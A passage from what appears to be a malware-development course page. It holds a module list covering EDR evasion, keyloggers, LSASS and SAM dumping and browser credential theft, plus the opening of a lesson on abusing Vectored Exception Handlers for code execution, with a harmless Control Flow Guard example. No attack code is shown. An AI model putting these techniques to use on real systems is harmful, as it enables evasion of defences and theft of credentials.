                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-41" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./41.html">
                    <div for="module-41" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 41 - Herpaderping Process Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-42" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./42.html">
                    <div for="module-42" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 42 - Herpaderply Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-43" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./43.html">
                    <div for="module-43" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 43 - Shellcode Reflective DLL Injection (sRDI)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-44" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./44.html">
                    <div for="module-44" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 44 - Patchless Threadless Injection Via Hardware BreakPoints
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-45" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./45.html">
                    <div for="module-45" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 45 - Tampered Syscalls Via Hardware BreakPoints
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-46" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./46.html">
                    <div for="module-46" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 46 - Exploiting EDRs For Evasion - Preventing EDR From Taking Action
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-47" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./47.html">
                    <div for="module-47" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 47 - Exploiting EDRs For Evasion - EDR LOLBINS
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-48" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./48.html">
                    <div for="module-48" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 48 - Process Hypnosis
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-49" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./49.html">
                    <div for="module-49" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 49 - Introduction To Object Files
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-50" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./50.html">
                    <div for="module-50" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 50 - Writing Beacon Object Files
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-51" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./51.html">
                    <div for="module-51" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 51 - Object File Loading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-52" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./52.html">
                    <div for="module-52" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 52 - Exploiting EDRs For Evasion - Finding Internal Exclusion List
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-53" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./53.html">
                    <div for="module-53" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 53 - Introduction To Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-54" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./54.html">
                    <div for="module-54" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 54 - Introduction to Ekko and Zilean Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-55" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./55.html">
                    <div for="module-55" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 55 - Introduction to Foliage Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-56" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./56.html">
                    <div for="module-56" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 56 - Implementing Ekko With Stack Spoofing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-57" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./57.html">
                    <div for="module-57" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 57 - Token Manipulation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-58" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./58.html">
                    <div for="module-58" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 58 - Library Proxy Loading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-59" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./59.html">
                    <div for="module-59" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 59 - Heap Encryption With Ekko Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-60" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./60.html">
                    <div for="module-60" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 60 - Introduction To Executing .NET Assemblies 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-61" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./61.html">
                    <div for="module-61" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 61 - Evading Microsoft Defender Via Patching 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-62" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./62.html">
                    <div for="module-62" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 62 - .NET Assemblies - Patching System.Environment.Exit
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-63" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./63.html">
                    <div for="module-63" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 63 - Capturing And Saving Screenshots Into Memory
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-64" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./64.html">
                    <div for="module-64" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 64 - Cross-Architecture Injection: x86 to x64 Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-65" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./65.html">
                    <div for="module-65" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 65 - KnownDll Cache Poisoning Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-66" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./66.html">
                    <div for="module-66" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 66 - Introduction to Keylogging
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-67" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./67.html">
                    <div for="module-67" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 67 - Developing a Keylogger
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-68" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./68.html">
                    <div for="module-68" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 68 - Sending Keystrokes To Remote Server
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-69" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./69.html">
                    <div for="module-69" class="ml-2 text-sm font-medium 
                                bg-blue-700 font-bold rounded-sm">
                        Module 69 - Manipulating VEH For Local Code Execution 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-70" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./70.html">
                    <div for="module-70" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 70 - Introduction To LSASS Dumping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-71" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./71.html">
                    <div for="module-71" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 71 - Fetching LSASS Handle And Bypassing PPL
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-72" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./72.html">
                    <div for="module-72" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 72 - LSASS Dump Via Handle Duplication
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-73" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./73.html">
                    <div for="module-73" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 73 - LSASS Dump Via RtlReportSilentProcessExit
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-74" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./74.html">
                    <div for="module-74" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 74 - LSASS Dump Via Seclogon Race Condition
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-75" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./75.html">
                    <div for="module-75" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 75 - Dumping The SAM Database
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-76" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./76.html">
                    <div for="module-76" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 76 - Dumping The SAM Remotely
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-77" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./77.html">
                    <div for="module-77" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 77 - Dumping The SAM From Disk
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-78" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./78.html">
                    <div for="module-78" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 78 - Domain Enumeration Using MS-SAMR
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-79" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./79.html">
                    <div for="module-79" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 79 - Dumping Browser Cookies: Firefox
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-80" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./80.html">
                    <div for="module-80" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 80 - Dumping Saved Logins: Firefox
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-81" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./81.html">
                    <div for="module-81" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 81 - Dumping Browser Cookies: Chrome
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-82" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./82.html">
                    <div for="module-82" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 82 - Dumping Saved Logins: Chrome
                    </div>
                </a>
            </div>
                </div>
    </div>
</div>          </div>
      </div>

      
      <div class="flex">
  <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 border-r border-l border-gray-600/60 pl-4 pt-2 pb-2 rounded-bl-xl rounded-br-xl shadow-inner">

          <div class="mr-2">
        <a data-target="_self" href="./68.html">
          <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Previous</button>
        </a>
      </div>
    
    <div class="mr-2">
      <a data-target="_self" href="../All Modules.html">
        <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Modules</button>
      </a>
    </div>

    <div class="my-2 mr-2">
      <form id="complete-module" action="./69/complete" method="POST">
      </form>
      <form id="uncomplete-module" action="./6#" method="POST">
      </form>
    </div>

          <div class="mr-2">
        <a data-target="_self" href="./70.html">
          <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Next</button>
        </a>
      </div>
    
  </div>
</div>

      
      <input type="hidden" id="objectives-completed" value="20973">

      
      <div id="copyWarning" class="fixed inset-0 hidden z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm">
  <div class="relative bg-gray-800 border border-gray-600 rounded-2xl shadow-2xl p-8 max-w-lg w-11/12 text-center transform transition-all scale-100">
    <p class="text-2xl font-bold text-white mb-4 tracking-wide">
      Reminder
    </p>
    <p class="text-gray-300 text-base mb-6 leading-relaxed">
      To remain compliant with the Terms of Service, avoid copying the entire module and instead copy the necessary sections.
    </p>
    <button onclick="hideCopyWarning()" class="w-full text-white font-medium rounded-lg text-sm px-5 py-2.5 text-center transition-all duration-200 bg-blue-600/80 hover:bg-blue-500/80 border border-blue-400/40 backdrop-blur-sm backdrop-saturate-150">
      I understand
    </button>
    <span class="absolute top-3 right-3 text-gray-400 hover:text-gray-200 cursor-pointer text-xl" onclick="hideCopyWarning()"></span>
  </div>
</div>


      
        </div>

  <footer id="footer" class="text-gray-400
    bg-gradient-to-t from-[#101926] via-[#172130] to-[#1e293b] backdrop-blur-md backdrop-saturate-150 z-20 border-t border-gray-700/50 border-gray-800
     hidden body-font">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4"> 2025 Maldev Academy Inc.</p>
        <a href="https://x.com/maldevacademy" target="_blank" class="text-gray-500 hover:text-white ml-2 sm:mt-0 mt-4">
          <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 1200 1227" xmlns="http://www.w3.org/2000/svg">
            <path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z" fill="white"></path>
          </svg>            
        </a>
        <a href="https://github.com/Maldev-Academy" target="_blank" class="text-gray-500 hover:text-white ml-2 sm:mt-0 mt-4">
          <svg class="w-6 h-6" fill="white" viewBox="0 0 24 24" aria-hidden="true"><path fill-rule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" clip-rule="evenodd"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos">
          Terms of Service
      </a></span><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos">
    </a></div><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos">
  </a></footer></template>

<div id="app-root">
  
  <div class="fixed bottom-4 right-5 bg-gray-900 text-white text-sm font-bold rounded-xl px-2 py-2 shadow-lg cursor-pointer z-20" onclick="window.scrollTo({ top: 0, behavior: 'smooth' });">
      <img src="69_files/module-up.svg" width="20px" alt="">
  </div>

  <div class="bg-[#101926] p-4">
      
      <div class="flex relative z-10">
    <input type="hidden" value="20973">
    <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 border-l border-t border-gray-600/60 pl-4 pt-2 pb-2 rounded-tl-xl">
        <div>
            Module 69 - Manipulating VEH For Local Code Execution 
        </div>
        <div class="ml-2 w-4 h-4 rounded-full shadow-inner bg-rose-500/90 ring-1 ring-rose-400/50"></div>

    </div>
    <div class="flex justify-end items-center w-1/2 bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 pr-4 pt-2 pb-2 rounded-tr-xl border-t border-r border-gray-600/60">
        <div class="progress-container pr-4">
        <img src="69_file#.svg" onclick="toggleProgress()" id="progressToggle" width="20" alt="Progress Toggle" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>

        <div class="enlarge-container pr-4">
        <img src="69_files/enlarge.svg" onclick="toggleScreenWidth()" id="enlargeToggle" width="20" alt="Screen Width" class="hover:bg-gray-600 rounded-sm cursor-pointer">
        </div>

        <div class="objectives-container pr-4">
        <img src="69_files/objectives.svg" onclick="toggleObjectives()" id="objectivesToggle" width="20" alt="Objectives" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>

        <div class="toc-container pr-4">
        <img src="69_files/toc.svg" onclick="toggleToC()" id="tocToggle" width="20" alt="ToC" class="hover:bg-gray-600 rounded-sm cursor-pointer bg-gray-600">
        </div>

        <div class="terminal-container  pr-4 ">
        <img src="69_files/ide.svg" onclick="toggleIde()" id="terminalToggle" width="22" alt="Terminal" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>
                                    <div class="dl-container">
                <a href="https://maldevacademy.com/new/download/file/Local-VEH-Manipulation" target="_blank">
                    <img src="69_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" width="20" alt="Download">
                </a>
                </div>
            
                            </div>
</div>
      <div id="height-container" class="flex h-full min-h-[800px]">
          <div class="flex max-w-full min-w-full">
              <div class="flex-1 min-w-0">
                  
                  <div id="description-container" class="viewer code-description h-full w-full bg-gray-800/70 backdrop-blur-md backdrop-saturate-150 p-4 px-5 md:px-10 lg:px-20 border border-t-0 border-gray-600/60 shadow-inner"><div class="toastui-editor-contents" style="overflow-wrap: break-word;">

    
    


    
    

    
    <div id="module-content" class="transition-opacity duration-300 opacity-100">
        <h2 id="toc-heading-0">Introduction to Vectored Handler Manipulation</h2>
<h3 id="toc-heading-1">Introduction</h3>
<p>Throughout this course, we've explored several use cases for Vectored
 Exception Handlers (VEH), which were first introduced in the <a href="./9" target="_blank">Utilizing Hardware Breakpoints For Hooking (1)</a>
 module. In this module, we'll examine another use for VEH, that is code
 execution. We will introduce how to manipulate VEH to force the 
execution of our own exception-handling routine, which can be a 
shellcode payload for example (this is showcased in a later module).</p>
<p>Furthermore, this module will also take <a href="https://learn.microsoft.com/en-us/windows/win32/secbp/control-flow-guard" target="_blank">Control Flow Guard (CFG)</a>
 into consideration where applicable due to its wide-spread adoption in 
various programs and to demonstrate the role it plays when dealing with 
vectored handlers.</p>
<h3 id="toc-heading-2">The Control Flow Guard (CFG)</h3>
<p>Control Flow Guard (CFG) is a security feature implemented in modern 
Windows operating systems to help mitigate exploitation techniques that 
hijack the execution flow of software. Introduced by Microsoft, CFG 
works by performing runtime checks on indirect function calls, ensuring 
that they only target legitimate code paths predetermined at compile 
time. This mechanism is particularly effective against common memory 
corruption attacks, such as buffer overflows, which aim to redirect a 
programs execution to malicious code.</p>
<p>To demonstrate how CFG works, consider the following C program, where
 a function pointer is assigned to a valid function at compile time, 
ensuring that only this legitimate function is called during runtime:</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>

<span class="token keyword">typedef</span> <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>operation<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    operation op <span class="token operator">=</span> add<span class="token punctuation">;</span>  <span class="token comment">// Valid function pointer assignment</span>
    <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token function">op</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Indirect call verified by CFG</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[&gt;] Result: %d\n"</span><span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>With CFG enabled, if an attacker attempts to alter the function pointer <code>op</code>
 to redirect execution to malicious code, the runtime check will detect 
that the new target is not part of the valid set of functions 
predetermined at compile time. This prevention mechanism stops the 
malicious code from being executed, illustrating how CFG contributes to 
the overall security of the system. For more details on CFG, refer to 
the following resources:</p>
<ul>
<li>
<p><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Zhang-Bypass-Control-Flow-Guard-Comprehensively-wp.pdf" target="_blank">Bypass Control Flow Guard Comprehensively</a></p>
</li>
<li>
<p><a href="https://dl.acm.org/doi/fullHtml/10.1145/3664476.3670432" target="_blank">Analysis of the Windows Control Flow Guard</a></p>
</li>
</ul>
<h3 id="toc-heading-3">The Types of Vectored Handlers</h3>
<p>In Windows exception handling, there are two primary types of vectored handlers:</p>
<ul>
<li>
<p>Vectored Exception Handler (VEH) - Executed immediately when an 
exception occurs. This handler type has already been extensively covered
 in previous modules throughout the course. To register a VEH, one can 
call the <a href="https://learn.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-addvectoredexceptionhandler" target="_blank">AddVectoredExceptionHandler</a> API.</p>
</li>
<li>
